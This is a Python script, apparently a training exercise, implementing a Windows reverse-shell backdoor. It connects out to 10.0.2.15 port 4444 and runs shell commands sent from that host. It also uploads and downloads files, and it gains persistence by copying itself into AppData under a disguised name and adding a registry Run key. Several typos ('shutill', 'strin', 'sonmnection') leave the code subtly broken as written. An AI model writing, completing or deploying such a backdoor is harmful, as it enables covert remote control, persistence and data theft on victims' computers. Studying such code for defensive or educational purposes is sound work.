#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutill

class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creates socket object
		self.connection.connect((ip, port))  # connects to target

	def become_persistent(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer Backup"  # setting location of evil file to appdata directory (hiden directory) followed by file name we want to change it to
		if not os.path.exists(evil_file_location):  # if evil file doesn't exist then we do below, this way we only have to add to registry once
			shutill.copyfile(sys.executable, evil_file_location)  # copying current executable to evil file locaion
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_sz /d "' + evil_file_location + '"', shell=True)
			# using system command to execute command that adds file to registry (executes everytime the system starts)

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command): 
		DEVNULL = open(os.devnull, 'wb')  # setting devnull equal to stream and opening as binaryt final (contains file stream for devnull where we transfer standard error and input to)
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, strin=DEVNULL)  # passes this to
		# subproccess.check_output which executes function and returns it to line it was captured from

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful."

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())  # encodes characters from images to known characters

	def run(self):
		while True:  # gives us ability to send/recieve > 1 command/response
			command = self.reliable_receive()  # stores datat recieved in command
			try:
				if command[0] == "exit":
					self.sonmnection.close()
					sys.exit()  # exits out of connection if command received is exit
				elif command[0] == "cd" and len(command) > 1:  # checks to see if command contains cd and something after
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":  # checks to see if command has download in it
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command)  # command passed trhough this function
			except Exception:
				command_result = "[-] Error during comand execution."
			self.reliable_send(command_result)
try:
	my_backdoor = Backdoor("10.0.2.15", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()
